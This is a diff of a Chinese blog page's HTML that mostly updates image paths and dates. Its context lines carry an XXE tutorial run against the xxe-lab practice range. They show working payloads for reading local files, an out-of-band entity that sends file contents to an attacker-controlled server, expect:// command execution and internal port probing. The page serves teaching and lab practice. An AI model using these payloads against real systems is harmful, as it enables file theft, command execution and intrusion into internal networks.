@@ -22,23 +22,23 @@
 <meta property="og:site_name" content="obsetear">
 <meta property="og:description" content="一、什么是XXE漏洞？XXE漏洞全称是XML External Entity Injection，即XML外部实体注入漏洞，当XML允许引用外部实体并解析时，攻击者就可以构造恶意实体的payload进行注入攻击，造成文件读取、命令执行、攻击内网网站及SSRF等危害。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/web/xxe1.jpg">
-<meta property="og:image" content="http://yoursite.com/web/xxe2.jpg">
-<meta property="og:image" content="http://yoursite.com/web/xxe3.jpg">
-<meta property="og:image" content="http://yoursite.com/web/xxe4.jpg">
-<meta property="og:image" content="http://yoursite.com/web/xxe5.jpg">
-<meta property="og:image" content="http://yoursite.com/web/xxe6.jpg">
-<meta property="og:image" content="http://yoursite.com/web/xxe7.jpg">
-<meta property="og:image" content="http://yoursite.com/web/xxe8.jpg">
-<meta property="og:image" content="http://yoursite.com/web/xxe9.jpg">
-<meta property="og:image" content="http://yoursite.com/web/xxe10.jpg">
-<meta property="og:image" content="http://yoursite.com/web/xxe11.jpg">
-<meta property="og:image" content="http://yoursite.com/web/xxe12.jpg">
-<meta property="og:updated_time" content="2020-07-25T09:20:21.335Z">
+<meta property="og:image" content="http://yoursite.com/img/web/xxe/xxe1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/web/xxe/xxe2.jpg">
+<meta property="og:image" content="http://yoursite.com/img/web/xxe/xxe3.jpg">
+<meta property="og:image" content="http://yoursite.com/img/web/xxe/xxe4.jpg">
+<meta property="og:image" content="http://yoursite.com/img/web/xxe/xxe5.jpg">
+<meta property="og:image" content="http://yoursite.com/img/web/xxe/xxe6.jpg">
+<meta property="og:image" content="http://yoursite.com/img/web/xxe/xxe7.jpg">
+<meta property="og:image" content="http://yoursite.com/img/web/xxe/xxe8.jpg">
+<meta property="og:image" content="http://yoursite.com/img/web/xxe/xxe9.jpg">
+<meta property="og:image" content="http://yoursite.com/img/web/xxe/xxe10.jpg">
+<meta property="og:image" content="http://yoursite.com/img/web/xxe/xxe11.jpg">
+<meta property="og:image" content="http://yoursite.com/img/web/xxe/xxe12.jpg">
+<meta property="og:updated_time" content="2020-11-15T12:09:09.219Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浅谈XXE漏洞：从XML到文件读取">
 <meta name="twitter:description" content="一、什么是XXE漏洞？XXE漏洞全称是XML External Entity Injection，即XML外部实体注入漏洞，当XML允许引用外部实体并解析时，攻击者就可以构造恶意实体的payload进行注入攻击，造成文件读取、命令执行、攻击内网网站及SSRF等危害。">
-<meta name="twitter:image" content="http://yoursite.com/web/xxe1.jpg">
+<meta name="twitter:image" content="http://yoursite.com/img/web/xxe/xxe1.jpg">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -339,27 +339,27 @@
 <p>index.php需要接收一个POST请求才能执行，我们把以下XML代码POST过去就可以实现任意文件读取：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
 
-<img src="/web/xxe1.jpg">
+<img src="/img/web/xxe/xxe1.jpg">
 
 <p><strong>实例：</strong></p>
 <p>靶场环境：xxe-lab<br>源码下载链接：<a href="https://codeload.github.com/c0ny1/xxe-lab/zip/master" target="_blank" rel="noopener">https://codeload.github.com/c0ny1/xxe-lab/zip/master</a></p>
 <p>进入靶场，发现这是一个登陆界面</p>
-<img src="/web/xxe2.jpg">
+<img src="/img/web/xxe/xxe2.jpg">
 
 <p>用burpsuite抓包发现，数据是利用XML进行传输的</p>
-<img src="/web/xxe3.jpg">
+<img src="/img/web/xxe/xxe3.jpg">
 
 <p>从上图可以看出响应包中显示的内容为username的值，然后我们就可以构造payload，最后输出在username里就可以了<br>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
 
-<img src="/web/xxe4.jpg">
+<img src="/img/web/xxe/xxe4.jpg">
 
 <p>这种是有回显的xxe注入。</p>
 <p>接下来我们尝试一下无回显的情况，修改源代码，添加<code>error_reporting(0);</code>禁止报错，并注释输出。</p>
-<img src="/web/xxe5.jpg">
+<img src="/img/web/xxe/xxe5.jpg">
 
 <p>再次尝试注入就不会返回结果</p>
-<img src="/web/xxe6.jpg">
+<img src="/img/web/xxe/xxe6.jpg">
 
 <p>这时我们就需要进行参数实体注入</p>
 <p>构造payload：</p>
@@ -370,29 +370,29 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://192.168.1.129/?content=%file;&apos;&gt;&quot;&gt; </span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure>
 
 <p>然后我们开始监控apache的访问日志，在终端输入：</p>
-<img src="/web/xxe7.jpg">
+<img src="/img/web/xxe/xxe7.jpg">
 
 <p>然后发送请求，执行payload</p>
-<img src="/web/xxe8.jpg">
+<img src="/img/web/xxe/xxe8.jpg">
 
 <p>浏览器上还是没有显示结果，不过这时再查看监控的日志文件，发现已经得到了doLogin.php的源码</p>
-<img src="/web/xxe9.jpg">
+<img src="/img/web/xxe/xxe9.jpg">
 
 <p><strong>命令执行</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
 
 <p><strong>注意：</strong>这种情况下得安装Expect拓展才能，而默认情况下expect是没有安装的。</p>
-<img src="/web/xxe10.jpg">
+<img src="/img/web/xxe/xxe10.jpg">
 
 <p><strong>内网探测/SSRF</strong></p>
 <p>由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
 <p>还用刚才的xxe-labs来演示，payload如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  xxe SYSTEM &quot;http://192.168.1.106:81&quot; </span><br><span class="line">&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
 
-<img src="/web/xxe11.jpg">
+<img src="/img/web/xxe/xxe11.jpg">
 
 <p>这里虽然有些地方是乱码的，不过可以看出81端口是没有开放的，我们再对比一下80端口的返回结果</p>
-<img src="/web/xxe12.jpg">
+<img src="/img/web/xxe/xxe12.jpg">
 
 <p>虽然80端口也有一点报错信息，但经过对比可以明显看出80端口是开放的。</p>
 <p><strong>DDoS拒绝服务攻击</strong></p>
@@ -426,7 +426,7 @@
         <p><span>本文标题:</span><a href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/">浅谈XXE漏洞：从XML到文件读取</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">obsem</a></p>
         <p><span>发布时间:</span>2020-04-20, 00:00:00</p>
-        <p><span>最后更新:</span>2020-07-25, 17:20:21</p>
+        <p><span>最后更新:</span>2020-11-15, 20:09:09</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/" title="浅谈XXE漏洞：从XML到文件读取">http://yoursite.com/2020/04/20/浅谈XXE漏洞：从XML到文件读取/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/04/20/浅谈XXE漏洞：从XML到文件读取/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -532,7 +532,7 @@
         
     </div>
 
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/07/29/内网渗透之CobaltStrike/">CobaltStrike</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/内网渗透之Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/内网渗透之windows基础/">Windows基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/">浅谈XXE漏洞：从XML到文件读取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/SSRF漏洞/">SSRF漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/23/csrf漏洞小结/">CSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/10/Mysql报错函数小结/">Mysql报错函数小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/10/文件包含漏洞小结/">文件包含漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/21/浅谈php一句话木马/">浅谈一句话木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/23/攻防世界web系列/">攻防世界web系列</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/10/10/python 正则表达式小结（笔记）/">python正则表达式小结（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/04/linux基础知识（笔记）/">Linux基础（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/26/内网渗透之Linux提权姿势/">Linux提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/16/内网渗透之windows提权的几种姿势/">windows提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/06/内网渗透之免杀/">免杀</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/29/内网渗透之CobaltStrike/">CobaltStrike</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/内网渗透之Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/内网渗透之windows基础/">Windows基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/">浅谈XXE漏洞：从XML到文件读取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/SSRF漏洞/">SSRF漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/23/攻防世界web系列/">攻防世界web系列</a></li></ul>
 
 
 
